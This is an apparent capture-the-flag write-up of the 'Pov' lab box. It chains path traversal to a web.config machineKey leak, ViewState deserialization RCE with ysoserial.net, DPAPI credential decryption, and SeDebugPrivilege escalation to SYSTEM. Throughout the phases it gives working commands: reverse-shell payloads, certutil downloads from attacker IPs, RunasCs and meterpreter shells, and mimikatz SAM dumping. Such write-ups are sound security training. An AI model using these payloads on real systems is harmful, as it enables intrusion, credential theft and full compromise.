

**Domain:** pov.htb

**Full chain:**

port 80 → vhost **dev.pov.htb** (ASP.NET) → `file=` path traversal reads **web.config** → steal **machineKey** → forge **`__VIEWSTATE`** with **ysoserial.net** → RCE as **sfitz** → `connection.xml` **PSCredential** → decrypt with **Import-CliXml** → **alaading** creds → **RunasCs** shell as alaading → **SeDebugPrivilege** → **SYSTEM**

> I finally cracked the ViewState step by running **ysoserial.net on a Windows box I already owned** (my Tombwatcher admin shell) instead of fighting mono on Parrot. **"What I learned"** boxes + the labeled **🔎 quick-reference** blocks are the real lesson.

---

## Phase 1 — Enumerate

Only **port 80**. Site references **pov.htb** → add to hosts:

```bash
echo '10.129.x.x pov.htb' | sudo tee -a /etc/hosts
```

Dead end I tried first: XSS on the contact form — nothing. Noted, moved on.

---

## Phase 2 — Vhost fuzzing → dev.pov.htb

One port + boring page → **vhost fuzz** (same IP, different `Host:`).

```bash
ffuf -u http://10.129.x.x/ -H "Host: FUZZ.pov.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -fc 302 -s
```

→ **`dev.pov.htb`**. Add it: `echo '10.129.x.x dev.pov.htb' | sudo tee -a /etc/hosts`

> **What I learned #1 — filter by the CONSTANT.** Junk had *varying size* but constant `Status: 302`, so `-fc 302` (not `-fs`). All-302 = "vhost doesn't exist, bounce away"; kill the 302s and what's left is real.

---

## Phase 3 — dev.pov.htb is ASP.NET

Signs: `.aspx` pages (`/portfolio/default.aspx`), hidden `__VIEWSTATE` field, ASP.NET cookies/headers.

> **What I learned #2 — the stack picks the attack.** ASP.NET ⇒ **Windows/IIS**; fuzz `.aspx/.asmx/.ashx`; the config to steal is **`web.config`** (holds `machineKey`); the signature attack is **ViewState deserialization** (leaked machineKey → forge `__VIEWSTATE` → RCE via `ysoserial.net`).

---

## Phase 4 — The download form (the lead)

`/portfolio/default.aspx` has a **download** button. Burp POST body:

```
__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=<base64>&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=<base64>&file=cv.pdf
```

The interesting field is **`file=`** — user-controlled filename = **path traversal / arbitrary file read** candidate.

---

## Phase 5 — `file=` traversal → read web.config → steal machineKey

Point `file=` at the config instead of the PDF (in Burp Repeater). web.config holds the `machineKey`:

```
file=web.config      (or traversal: file=/web.config)
```

Got:

```xml
<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
  validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
```

What I learned #3 — why the machineKey is game over for ASP.NET. 

ASP.NET signs (and optionally encrypts) __VIEWSTATE with this key so the server trusts it blindly on the way back. If I know the key, I can hand the server a __VIEWSTATE it will deserialize, and a crafted serialized object = code execution. General LFI payloads (../etc/passwd style) don't help here — on IIS the prize is web.config → machineKey → ViewState RCE, not reading /etc/passwd.

---

## Phase 6 — ViewState RCE → shell as sfitz

### 🔎 ASP.NET VIEWSTATE RCE — quick reference

**When to use this:** ASP.NET site + you have the machineKey (validationKey/validationalg, and decryptionKey/decryptionalg if encrypted) + a page that posts back __VIEWSTATE (you need its __VIEWSTATEGENERATOR and the page path).

**How do I know I can abuse it:** you can read web.config (or otherwise leak the keys), AND the target page round-trips a __VIEWSTATE. If both are true → forge away.

Tool: ysoserial.net (the ViewState plugin). It is a .NET/Windows tool — it does NOT run cleanly under mono on Linux (it crashes loading PresentationCore/WPF for every gadget, not just one). So run it on Windows.

If it fails: 302 → aspxerrorpath with no RCE = the server rejected your signature → almost always a URL-encoding problem (you MUST URL-encode the whole blob, +→%2B etc.) or wrong generator/path/key. Confirm RCE with a ping payload + tcpdump filtered on the target's source IP.

### The saga (and the fix)

`ysoserial.net` would **not** run under mono on Parrot — every gadget died with `FileNotFoundException: PresentationCore` during init. viewgen (Python) generated a blob but I couldn't confirm execution.

**The breakthrough:** I didn't have a Windows VM — **but I had an Administrator WinRM shell on Tombwatcher (Windows!)**. So I used *that* as my ysoserial host. Upload, extract, run natively:

```powershell
upload ysoserial.zip

Expand-Archive -Path .\ysoserial.zip -DestinationPath .\ysoserial
```

Then generate the ViewState, with the **reverse shell baked in as base64**--> you can geneate ut throughreversell geneator and use the opttion powershell3 base64. (no file to download → quieter, self-contained):

```powershell
.\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AI...<base64 code>"
```


Take the blob it prints → in Burp Repeater set it as `__VIEWSTATE=`,  (ysoserial's output doesnt need  to URL-encode)**, remove `__EVENTVALIDATION`, keep `__VIEWSTATEGENERATOR=8E0F0FA3`. Start a listener, send it → **shell as `sfitz`**. 🎉

What I learned #4 — use the tools where they run. A .NET tool that won't run on my attack box isn't a dead end if I already own a Windows machine — any popped Windows host becomes my build/exec environment. Bake the payload in as base64 (-c "powershell -e ...") so there's nothing to host or download.

What I learned #5 — the two "big blobs" explained.

- The JABjAGwAaQBl... string = the PowerShell reverse shell, base64 of UTF-16LE text (that's what powershell -e wants — made by revshells.com "PowerShell #3 (Base64)"). It becomes the -c command ysoserial runs on the target.
- The MiKpJYhP7g0bW%2Fiv... string = the forged __VIEWSTATE itself (serialized + signed with the machineKey, then URL-encoded — the %2F/%2B are the encoding). Neither is a hash — one is the payload command, the other is the signed ViewState object.

---

## Phase 7 — sfitz → alaading (PSCredential in connection.xml)

`whoami` = **sfitz**. In `C:\Users\sfitz\Documents\connection.xml`:

```
UserName: alaading
Password: 01000000d08c9ddf0115d1118c7a00c04fc297eb...  (System.Management.Automation.PSCredential)
```

### 🔎 EXPORTED PSCREDENTIAL (connection.xml) — quick reference

**When to use this:** you find a .xml (often connection.xml / cred.xml) whose password is a long hex blob starting 01000000d08c9ddf... and mentions System.Management.Automation.PSCredential.

**How do I know I can decrypt it:** that blob is DPAPI-encrypted, tied to the user + machine that created it. If you are running as that user on that same box (here: sfitz, whose Documents hold the file), Windows decrypts it for you automatically — no cracking.

Do it:

```powershell
$cred = Import-CliXml -Path connection.xml
$cred.GetNetworkCredential().Password
```

If it fails ("key not valid" / exception): you're not the user who made it, or not on the same host → you'd have to steal that user's DPAPI masterkey instead (mimikatz dpapi::), which is a lot more work. That's exactly why the walkthrough decrypts it on the box as sfitz rather than exfiltrating it.

→ **`alaading : f8gQ8fynP44ek1m3`**.

> **What I learned #6 — "how did they know it decrypts on that PS?"** Because DPAPI blobs (`01000000d08c9ddf...`) are decryptable **only** by the original user on the original machine. The file sat in **sfitz's** profile and I was running **as sfitz** → `Import-CliXml` just works. If I'd copied it to Parrot it would be useless without the masterkey.

---

## Phase 8 — Run as alaading (RunasCs)

`nxc` with alaading's creds showed **nothing usable** (no admin, not in Remote Management → no WinRM), and my shell is **sfitz**, not alaading. So I have a password but no logon path for that user.

### 🔎 RUNASCS — quick reference

**When to use this:** you have another user's cleartext password but can't log in as them (they lack WinRM/RDP, and you're stuck in a shell as a different user). RunasCs spawns a process as that user from a non-interactive shell (and can give you a network reverse shell with -r).


Find a writable dir, pull RunasCs, fire a reverse shell as alaading:

```powershell
icacls C:\ProgramData

certutil -urlcache -f http://10.10.15.249:8999/RunasCs.exe RunasCs.exe

.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.6:444
```

Catch it:

```bash
rlwrap -cAr nc -lnvp 444
```
 
> **What I learned #7 — why `rlwrap -cAr`.** `nc` shells are dumb — no arrow keys, no history, backspace garbles. **`rlwrap`** wraps netcat with readline so you get a usable line editor. `-c` = complete filenames, `-A` = force ANSI/colour handling, `-r` = remember words seen for completion. Quality-of-life, not required, but makes a raw Windows shell far less painful.
> you can `sudo apt install rlwrap -y` to get this.

---

## Phase 9 — alaading → SYSTEM (SeDebugPrivilege)

`whoami /priv` shows **SeDebugPrivilege**.

**What I learned #8 —** SeDebugPrivilege = open ANY process (incl. SYSTEM). That's the whole key. With it you can OpenProcess on a process running as NT AUTHORITY\SYSTEM, then inject into it / steal its token / spawn a child under it → you become SYSTEM. It's a different beast from SeImpersonatePrivilege (that's the one the Potato attacks — PrintSpoofer/GodPotato — abuse). Match the tool to the privilege: SeDebug → migrate/PPID-spoof/token-steal; SeImpersonate → potatoes.

"disabled in cmd, enabled in PowerShell — is that possible?" Yes. A privilege can be present but not enabled in a token; whoami /priv shows Disabled in cmd. Tools enable it before use (meterpreter/psgetsys call AdjustTokenPrivileges). PowerShell/your injected process may already have it enabled while the plain cmd token showed it disabled — "present" is what matters; enabling it is a flip you (or the tool) do.

### How to find a SYSTEM process (you need its PID)

```
meterpreter > ps            # look at the User column for NT AUTHORITY\SYSTEM

# or in a shell:

tasklist /v                              # shows the owner
Get-Process -IncludeUserName             # PowerShell
```

**winlogon.exe** is the classic target because it is **always present and always SYSTEM**. If it weren't there, any other SYSTEM process works — `services.exe`, `csrss.exe`, `lsass.exe` (avoid lsass — AV/crash risk), `spoolsv.exe`. You pick by the **User = SYSTEM** column, not the name.

---

## 🧭 Getting SYSTEM — your options

#### **Option 1 — Meterpreter migrate (easiest, used in the walkthrough)**


First generate a reverse shell to capture alaading in meterpreter to use it to migrate to system.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f exe -o rev.exe            
```


```
msf6 > use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp 
set LHOST tun0 ; set LPORT 9001 
run


# on POV: .\rev.exe  → session opens

meterpreter > ps winlogon          # get the SYSTEM pid (e.g. 548)
meterpreter > migrate 548
meterpreter > getuid               # NT AUTHORITY\SYSTEM
```
 
> **"Does just migrating give me SYSTEM? Or is it SeDebug?"** It's **SeDebug**. `migrate` = inject your meterpreter into the target process; to inject into a **SYSTEM** process you must be able to open it, which is exactly what **SeDebugPrivilege** grants. No SeDebug → `migrate 548` fails with access denied. So: SeDebug is *why* it works; migrate is *how*. (You could also just try `getsystem`, which attempts several of these techniques automatically.)

#### **Option 2 — psgetsys.ps1 (PPID spoofing, no Metasploit)**

```powershell
certutil -urlcache -f http://10.10.14.6/psgetsys.ps1 psgetsys.ps1
. .\psgetsys.ps1

ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <base64 revshell>"
```


Spawns your command as a child of a SYSTEM process → child inherits SYSTEM.
The Error 122 trap I hit: ERROR_INSUFFICIENT_BUFFER + no shell. It looked like "command too long," but a short ping payload failed the same way → the real issue was the shell process type (the reverse/RunasCs shell didn't play nice with the impersonation). 

Fix: tunnel WinRM with chisel and run it from an evil-winrm shell instead:

```bash
# chisel tunnel 5985→5985 set up first on target:
chisel client <ATTACK_IP>:<PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>

#on attackbox
chisel server --reverse -p <PORT>


#then:
evil-winrm -i 127.0.0.1 -u alaading -p f8gQ8fynP44ek1m3
```

Then Same ImpersonateFromParentPid command from the evil-winrm shell → SYSTEM shell at nc. 

Lesson: if a local-exploit acts weird, the shell you're running it from matters — a cleaner shell (WinRM) often fixes it.

#### **Option 3 — token theft (my own add, no injection)**

With SeDebugPrivilege you can **borrow** an existing SYSTEM process's token instead of injecting. Key idea: **grabbing the token is only half of it** — a token does nothing on its own. You then have to **spawn a new process *with* that token**; that child runs as SYSTEM. So it's always *grab → spawn*.

##### **3a — Meterpreter / incognito** 

grab, then the token applies to YOUR session — run commands or drop a shell:

```
meterpreter > getprivs                         # confirm SeDebugPrivilege is there
meterpreter > load incognito
meterpreter > list_tokens -u                   # see which SYSTEM tokens exist
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid                           # NT AUTHORITY\SYSTEM
```

**After the token:** your meterpreter is now SYSTEM — just act. 

`shell` for a cmd prompt, `execute -f cmd.exe -i -t` to launch a new process *with the stolen token* (`-t`), or `cat C:\Users\Administrator\Desktop\root.txt`. To drop back, `rev2self`.

##### **3b — mimikatz** 

`token::elevate` grabs a SYSTEM token AND applies it to the mimikatz process, so the NEXT thing mimikatz does is as SYSTEM:

```
privilege::debug           # enable SeDebugPrivilege
token::elevate             # impersonate the first SYSTEM token it finds
# now mimikatz is SYSTEM — prove / use it:
token::whoami              # NT AUTHORITY\SYSTEM
lsadump::sam               # e.g. dump local hashes as SYSTEM
token::revert              # drop back when done
```

**After the token:** mimikatz itself is SYSTEM only for its own actions (dump SAM/LSA, read protected files). If you want a **SYSTEM shell** rather than just mimikatz commands, use the meterpreter path (3a) or PsExec the dumped Administrator hash:

```bash
impacket-psexec Administrator@10.129.x.x -hashes :<NT_hash_from_sam>
```

> **The gotcha with token impersonation:** the token you steal is usually an **impersonation token**, which applies to the *current thread/process*, not a brand-new detached one you launch carelessly. That's why meterpreter's `execute -t` (use my impersonated token) and mimikatz's in-process model matter — if you just `start cmd` the normal way, the child may spawn back as **your** user, not SYSTEM. Always launch the child *through* the tool holding the token.

Good when injection/migration (Option 1/2) is flagged by AV, or when you only need to *read* something as SYSTEM (root.txt, SAM) rather than hold a full shell.

```bash
rlwrap -cAr nc -lnvp 9002   # catch the SYSTEM shell → whoami = nt authority\system → root.txt
```

**SYSTEM.** 👑 Box done.

---

## 🧭 POV endgame decision tree

```
ASP.NET + can read web.config?
   └─ steal machineKey → ysoserial.net ViewState (run it on a WINDOWS box) → RCE
          │  (fails? → URL-encode the whole __VIEWSTATE, check generator/path, ping-test with tcpdump on TARGET ip)
          ▼ shell as sfitz
Find connection.xml / cred.xml (01000000d08c9ddf...)?
   └─ running as the file's owner on that box → Import-CliXml → plaintext creds
          ▼ alaading creds, but no WinRM/admin
Have creds, can't log in as them?
   └─ RunasCs <user> <pass> cmd.exe -r <you>:<port>  → shell as that user
          ▼ whoami /priv
SeDebugPrivilege?                         SeImpersonatePrivilege?
   └─ migrate / PPID-spoof / token-steal     └─ PrintSpoofer / GodPotato
          ▼
       NT AUTHORITY\SYSTEM
```

---

## Takeaways

1. One port + boring page → **vhost fuzz**, filter by the **constant** status.
2. **ASP.NET → Windows/IIS**; the prize is **web.config → machineKey**, not `/etc/passwd`.
3. **machineKey → ysoserial.net ViewState → RCE.** Run ysoserial on **Windows** (it won't mono on Linux); **bake the shell in as base64**; **URL-encode the whole blob**; confirm with a ping + target-filtered tcpdump.
4. **A popped Windows box is your tooling host** when your attack box can't run a .NET tool.
5. **`01000000d08c9ddf...` = DPAPI PSCredential** → `Import-CliXml` **as that user on that box** → plaintext. Don't exfil it.
6. **Creds but no logon path → RunasCs** (`-r` for a reverse shell). `rlwrap -cAr` makes the nc shell usable.
7. **Match privilege to tool:** **SeDebug** → migrate / PPID-spoof / token-steal into a **SYSTEM** process (find it by **User=SYSTEM**, winlogon is the safe classic). **SeImpersonate** → Potatoes. A privilege can be **present-but-disabled**; tools enable it.
8. **If a local exploit misbehaves, switch shells** (WinRM via chisel) — the host shell's type can be the real blocker.
